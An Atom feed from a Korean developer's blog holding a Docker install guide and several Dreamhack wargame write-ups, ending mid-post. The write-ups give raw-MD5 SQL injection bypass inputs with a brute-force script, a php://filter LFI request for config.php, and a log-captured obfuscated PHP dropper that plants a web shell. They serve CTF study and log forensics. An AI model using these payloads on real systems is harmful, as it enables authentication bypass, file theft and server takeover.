<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-02T20:09:33+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">Docker 설치하기</title><link href="http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98/" rel="alternate" type="text/html" title="Docker 설치하기" /><published>2023-10-02T00:00:00+09:00</published><updated>2023-10-02T23:13:00+09:00</updated><id>http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98</id><content type="html" xml:base="http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98/"><![CDATA[<h2 id="설치된-docker-버전-삭제하기">설치된 Docker 버전 삭제하기</h2>

<ul>
  <li>Docker engine 을 설치하기 전, 설치된 docker 패키지들을 삭제하여야 한다.</li>
  <li>비공식 패키지들 삭제하여야 한다.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">docker.io</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-compose</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-doc</code></li>
      <li><code class="language-plaintext highlighter-rouge">podman-docker</code></li>
    </ul>
  </li>
  <li>Docker Engine 의 의존성인 <code class="language-plaintext highlighter-rouge">containerd.io</code> 와의 충돌을 피하기 위해서  <code class="language-plaintext highlighter-rouge">containerd</code>, <code class="language-plaintext highlighter-rouge">runc</code> 역시 삭제하여야 한다.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">for pkg in docker.io docker-doc docker-compose podman-docker containerd runc;</span><span class="w"> </span><span class="k">do </span><span class="nb">sudo </span>apt-get remove <span class="nv">$pkg</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<h2 id="패키지를-이용하여-docker-설치하기">패키지를 이용하여 docker 설치하기</h2>

<ul>
  <li>apt 를 이용하여 docker 을 설치하는 것이 아닌 <code class="language-plaintext highlighter-rouge">dpkg</code> 를 사용하여 docker을 설치하는 방법을 정리하였다.</li>
  <li><code class="language-plaintext highlighter-rouge">deb</code> 파일을 다운로드 받고 설치해주면 된다. 그리고 만약 업그레이를 원한다면 새로운 파일을 다운로드 받고 설치해주면 된다. ( 삭제할 필요는 없다. )</li>
</ul>

<ol>
  <li><a href="https://download.docker.com/linux/ubuntu/dists/">Index of linux/ubuntu/dists/ (docker.com)</a> 링크로 들어간다.</li>
  <li>ubuntu 버전을 선택한다. ( 특정 버전 폴더로 이동하기 )</li>
  <li><code class="language-plaintext highlighter-rouge">pool/stable</code> 로 이동하고 현재 아키텍처를 선택한다. ( <code class="language-plaintext highlighter-rouge">amd64</code>, <code class="language-plaintext highlighter-rouge">armhf</code>, <code class="language-plaintext highlighter-rouge">arm64</code>, <code class="language-plaintext highlighter-rouge">s390x</code> )</li>
  <li>
    <p>Docker Engine 그리고 CLI, containerd, Docker Compose packages deb 파일들 다운로드를 한다.</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">containerd.io_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-ce_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-ce-cli_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-buildx-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-compose-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">.deb</code> 패키지 설치하기.</li>
</ol>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sudo dpkg -i ./containerd.io_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-ce_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-ce-cli_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-buildx-plugin_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-compose-plugin_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb
</code></pre></div></div>

<ul>
  <li>Docker Engine 이 성공적으로 설치되어 있는지 확인하기.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sudo service docker start
sudo docker run hello-world
</span></code></pre></div></div>

<h3 id="docker-engine-업그레이드">Docker Engine 업그레이드</h3>
<ul>
  <li>업그레이드 버전의 package 파일들을 다운로드하고 위의 과정을 반복해주면 된다.</li>
</ul>

<h2 id="우분투-architecture-확인법">우분투 Architecture 확인법</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dpkg -s libc6 | grep Arch
</span></code></pre></div></div>

<h2 id="우분투-버전-확인법">우분투 버전 확인법</h2>
<ul>
  <li>VERSION_CODENAME 을 확인해주면 된다.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cat /etc/os-release
</span></code></pre></div></div>

<h2 id="wsl2-에서-docker-start-가-안될-때">WSL2 에서 Docker Start 가 안될 때</h2>

<ol>
  <li><code class="language-plaintext highlighter-rouge">sudo update-alternatives --config iptables</code></li>
  <li>“1” 번을 입력하고 엔터를 누른다. ( 즉, iptables-legacy 선택 )</li>
  <li><code class="language-plaintext highlighter-rouge">sudo service docker start</code></li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[Install Docker Engine on Raspberry Pi OS</td>
          <td>Docker Docs](https://docs.docker.com/engine/install/raspberry-pi-os/#install-from-a-package)</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li><a href="https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/">Index of linux/ubuntu/dists/jammy/pool/stable/amd64/ (docker.com)</a></li>
  <li><a href="https://main.tistory.com/26">Ubuntu Architecture 확인 방법 (tistory.com)</a></li>
  <li><a href="https://askubuntu.com/questions/1437128/docker-service-wont-start-on-ubuntu-22-04-on-wsl2">Docker service won’t start on Ubuntu 22.04 on WSL2 - Ask Ubuntu</a></li>
  <li><a href="https://askubuntu.com/questions/1437128/docker-service-wont-start-on-ubuntu-22-04-on-wsl2">Docker service won’t start on Ubuntu 22.04 on WSL2 - Ask Ubuntu</a></li>
  <li><a href="https://www.lainyzine.com/ko/article/how-to-start-shutdown-reboot-wsl-linux/">WSL 리눅스 시작/종료/재부팅 방법 (lainyzine.com)</a></li>
  <li><a href="https://seong6496.tistory.com/316">우분투 버전 간단한 확인방법 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Ubuntu" /><category term="docker" /><summary type="html"><![CDATA[설치된 Docker 버전 삭제하기]]></summary></entry><entry><title type="html">PHP md5 (SQL Injection)</title><link href="http://localhost:4000/dreamhack/SQLiPHPmd5/" rel="alternate" type="text/html" title="PHP md5 (SQL Injection)" /><published>2023-09-12T00:00:00+09:00</published><updated>2023-09-12T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/SQLiPHPmd5</id><content type="html" xml:base="http://localhost:4000/dreamhack/SQLiPHPmd5/"><![CDATA[<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/337">wargame.kr md5 password 워게임 Dreamhack</a></li>
</ul>

<h2 id="php-md5">PHP md5</h2>
<ul>
  <li>md5 해시화를 이용하여 sql injection 공격을 시도할 수 있다.</li>
</ul>

<h3 id="분석">분석</h3>
<ul>
  <li>php 의 md5 기능을 이용하여 사용자의 입력을 해시화 한다.</li>
  <li>해시화 한 값을 이용하여 password 와 비교한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span><span class="err"> </span><span class="o">*</span><span class="err"> </span><span class="k">from</span><span class="err"> </span><span class="n">admin_password</span><span class="err"> </span><span class="k">where</span><span class="err"> </span><span class="n">password</span><span class="o">=</span><span class="s1">'".md5($ps,true)."'</span>
</code></pre></div></div>

<ul>
  <li>md5(입력,true) : 16자리의 바이너리를 반환한다.</li>
  <li>md5(입력,flase) : 32 문자열 16진수를 반환한다.</li>
</ul>

<h3 id="공격">공격</h3>

<h4 id="방법-1--or">방법 1 : or</h4>
<ul>
  <li>or 을 이용하여 password 인증을 우회해보자.</li>
  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'or'</code> 이 존재하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true)= aaa'or'bbb

select * from admin_password where password='aaa'or'bbb'
</code></pre></div></div>

<ul>
  <li>
    <p>or 앞 부분이 False 여도 뒷 부분이 true 이기 때문에 비밀번호 인증 우회가 가능하다.</p>
  </li>
  <li>
    <p>sql injection 공격 payload.</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>129581926211651571912466741651878684928

md5 = �T0D��o#��'or'8
</code></pre></div></div>

<h4 id="방법-2--">방법 2 : =</h4>
<ul>
  <li>= 을 이용하여 password 인증을 우회해보자.</li>
  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'='문자</code> 이 존재하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true) = asdfaskd'='asdf

select * from admin_password where password='asdfaskd'='asdf'
</code></pre></div></div>

<ul>
  <li>원리</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>where password='asdfaskd'='asdf'

는 먼저 앞 부분을 비교한다.

where (password='asdfaskd')='asdf'

where false='asdf' 

여기서 mysql false 의 타입은 tinyint 이고 값은 0 이다.
'asdf' 타입을 SIGNED 즉 int 형으로 바꿔서 비교를 진행한다.

따라서 비교하는 값은 다음과 같다.

where 0=0
</code></pre></div></div>

<ul>
  <li>직접 확인하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'123'</span><span class="p">;</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'aaaa'</span><span class="p">;</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre></div></div>

<ul>
  <li>여기서 주의해야 할 점이 있는데 <code class="language-plaintext highlighter-rouge">'123adfsf'</code> 와 같은 형태를 int 형으로 타입 변환하면 123 으로 변환되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">cast</span><span class="p">(</span><span class="s1">'123asdf'</span> <span class="k">as</span> <span class="nb">SIGNED</span><span class="p">);</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">123</span>
</code></pre></div></div>

<ul>
  <li>sql injection 공격 payload.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>98750788
md5 = n�A�nI�^���h'='

하지만 다음 값은 실패한다.
38106544
md5 = &amp;�p'='63@-��

왜냐하면
1. select * from admin_password where password='&amp;�p'='63@-��'
2. select * from admin_password where false='63@-��'
3. select * from admin_password where false=63
4. select * from admin_password where 0=63

0과 63을 비교하는 형태가 되기 때문이다.
</code></pre></div></div>

<h3 id="평문-값-찾기">평문 값 찾기</h3>
<ul>
  <li>python 을 이용하여 <code class="language-plaintext highlighter-rouge">'='</code> 값이 들어가는 평문 값을 쉽게 찾아줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>

<span class="n">key1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"'='"</span>
<span class="n">key2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"'or'"</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100_000_000</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="nf">md5</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="n">key1</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">key1</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">elif</span> <span class="n">key2</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">key2</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://heavening.tistory.com/85">int의 종류 및 크기 tinyint, smallint, int, bigint 초간단 정리 (tistory.com)</a></li>
  <li><a href="https://www.php.net/manual/en/function.md5.php">PHP: md5 - Manual</a></li>
  <li><a href="https://onecompiler.com/mysql">mysql 온라인 컴파일러</a></li>
  <li><a href="https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">SQL injection with raw MD5 hashes (Leet More CTF 2010 injection 300) - Christian von Kleist (posthaven.com)</a></li>
  <li><a href="https://github.com/seunghunoh57/SQL-Injection">seunghunoh57/SQL-Injection: This program will generate a password that bypasses a PHP script using raw md5 encryption for its password. (github.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="md5" /><category term="sqli" /><summary type="html"><![CDATA[php 의 md5 기능을 우회하여 sql injection 공격을 시도해보자.]]></summary></entry><entry><title type="html">PHP 비교연산자</title><link href="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/" rel="alternate" type="text/html" title="PHP 비교연산자" /><published>2023-09-11T00:00:00+09:00</published><updated>2023-09-11T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90</id><content type="html" xml:base="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/"><![CDATA[<ul>
  <li>php 에 존재하는 취약점이다!</li>
</ul>

<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/338">jff3_magic 워게임 Dreamhack</a></li>
</ul>

<h2 id="php-비교-연산자">PHP 비교 연산자</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">==</code> : 자료형에 상관없이 값만 비교한다.</li>
  <li><code class="language-plaintext highlighter-rouge">===</code> : 자료형 및 값을 비교한다.</li>
</ul>

<h3 id="취약점">취약점</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">==</code> 이용하여 값을 비교할 때 값 만을 비교하여 발생할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">'0e2'</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$a</span><span class="o">==</span><span class="s1">'0'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="n">e123</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$a</span><span class="o">==</span><span class="s1">'0'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<h3 id="magic-hash">Magic Hash</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">0e1234</code> 문자열을 이용하여 비교를 하면 php 에서는 float 형식으로 인식하게 된다.</li>
  <li>즉 0e 로 시작하고 뒤에 모두 숫자가 오는 문자열을 이용하여 비교를 하면 float 형식으로 인식하게된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0e2 == 0*10^2 == 0
즉 0을 비교하는 것이랑 같은 효과를 발생한다.
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://t-okk.tistory.com/27">HackCTF Web 마법봉 (매직해시 취약점) (tistory.com)</a></li>
  <li><a href="http://php.adamharvey.name/manual/kr/types.comparisons.php">PHP: PHP 자료형 비교표 - Manual (adamharvey.name)</a></li>
  <li><a href="https://comsec.tistory.com/86">HackCTF  Hash  :: 보안 한 걸음 (tistory.com)</a></li>
  <li><a href="https://acloit.tistory.com/entry/%EB%A7%A4%EC%A7%81%ED%95%B4%EC%8B%9C">매직해시 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="비교연산자" /><summary type="html"><![CDATA[PHP 비교연산자 취약점에 대하여 알아보자.]]></summary></entry><entry><title type="html">[wargame.kr] weblog-1 문제</title><link href="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/" rel="alternate" type="text/html" title="[wargame.kr] weblog-1 문제" /><published>2023-09-10T00:00:00+09:00</published><updated>2023-09-10T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0</id><content type="html" xml:base="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/"><![CDATA[<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/71">weblog-1 문제</a></li>
</ul>

<h2 id="level-0">LEVEL 0</h2>
<ul>
  <li>log 의 기록을 보고 admin 계정을 비밀번호를 찾아주면 된다.</li>
  <li>로그 분석 결과 500 에러(서버 에러)가 발생할 때 나오는 비교 정수 값을 char 로 변환해주면 된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">'./file/access.log'</span><span class="p">)</span>
<span class="n">keyword</span> <span class="o">=</span> <span class="s">'HTTP/1.1" 500'</span>
<span class="n">keyword2</span> <span class="o">=</span> <span class="s">'))='</span>

<span class="n">arr</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="s">'end'</span><span class="p">)</span>
        <span class="k">break</span>
    
    <span class="k">if</span> <span class="n">keyword</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
        <span class="k">continue</span>

    <span class="n">a</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">keyword2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">continue</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">a</span><span class="o">+</span><span class="nf">len</span><span class="p">(</span><span class="n">keyword2</span><span class="p">):]</span>

    <span class="n">l</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="s">','</span><span class="p">)</span>

    <span class="n">arr</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[:</span><span class="n">l</span><span class="p">])))</span>
    <span class="c1"># print(line[:l])
</span>    
<span class="nf">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">arr</span><span class="p">))</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="level-1">LEVEL 1</h2>
<ul>
  <li>config.php 파일을 추출해야 한다.</li>
  <li>include 를 이용하여 파일을 추출하는 것을 확인할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/admin/?page=php://filter/convert.base64-encode/resource=../config.php
</code></pre></div></div>

<h2 id="level-2">LEVEL 2</h2>
<ul>
  <li>
    <p>LFI(Local File Include) 취약점을 이용하여 서버의 php 코드를 실행하는 것을 확인할 수 있다.</p>
  </li>
  <li>
    <p>악성 php 코드 저장</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&amp;memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>

<ul>
  <li>코드를 살펴본 결과 memo.php 에서 memo 파라미터로 들어오는 값을 session 에 저장하는 것을 확인할 수 있다.</li>
  <li>session에 저장된 값을 불러오기 위해서 include 기능을 이용한 것을 확인할 수 있다.</li>
  <li>악성 코드가 서버에서 실행된다!</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>

<h2 id="level-3">LEVEL 3</h2>
<ul>
  <li>웹 쉘 코드가 저장된 위치를 알아내야 한다.</li>
  <li>level2 에서 실행시킨 코드이다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="k">function</span> <span class="n">m</span><span class="p">(</span><span class="nv">$l</span><span class="p">,</span><span class="nv">$T</span><span class="o">=</span><span class="mi">0</span><span class="p">){</span>
	<span class="nv">$K</span><span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d'</span><span class="p">);</span>
	<span class="nv">$_</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$l</span><span class="p">);</span>
	<span class="nv">$__</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$K</span><span class="p">);</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
		<span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nv">$__</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
			<span class="k">if</span><span class="p">(</span><span class="nv">$T</span><span class="p">){</span>
				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">^</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nv">$l</span><span class="p">;</span>
<span class="p">}</span> 
<span class="nf">m</span><span class="p">(</span><span class="s1">'bmha[tqp[gkjpajpw'</span><span class="p">)(</span><span class="nf">m</span><span class="p">(</span><span class="s1">'+rev+sss+lpih+qthke`w+miecaw*tlt'</span><span class="p">),</span><span class="nf">m</span><span class="p">(</span><span class="s1">'8;tlt$lae`av,&amp;LPPT+5*5$040$Jkp$Bkqj`&amp;-?w}wpai, [CAP_&amp;g&amp;Y-?'</span><span class="p">));</span> 
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>난독화 되어있는 것을 확인할 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">date('Y-m-d')</code> 를 02/Jun/2020 즉 <code class="language-plaintext highlighter-rouge">2020-06-02</code> 로 바꾼 다음 php 로 실행시켜 주면 어떻게 웹 쉘 코드를 업로드 하였는지 출력되는 것을 확인할 수 있다.</li>
</ul>

<h2 id="level-4">LEVEL 4</h2>
<ul>
  <li>처음으로 실행된 명령어는 로그를 보면 바로 알 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:56:32 +0000] "GET /uploads/images.php?c=whoami HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="access.log" /><summary type="html"><![CDATA[weblog-1 문제 풀이]]></summary></entry><entry><title type="html">[wargame.kr] PHP LFI 문제</title><link href="http://localhost:4000/dreamhack/php_LFI_vuln/" rel="alternate" type="text/html" title="[wargame.kr] PHP LFI 문제" /><published>2023-08-29T00:00:00+09:00</published><updated>2023-08-29T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_LFI_vuln</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_LFI_vuln/"><![CDATA[<h2 id="lfi--php-wrapper">LFI + PHP Wrapper</h2>
<ul>
  <li>include 취약점과 wrapper 취약점을 이용하여 문제를 해결해 주어야 한다.</li>
</ul>

<h3 id="코드-분석">코드 분석</h3>
<ul>
  <li>include 부분에 취약점이 존재한다.</li>
  <li>요청 파라미터로 아무것도 받지 못하면 디펄트로 설정된 main.php 파일을 include 한다.</li>
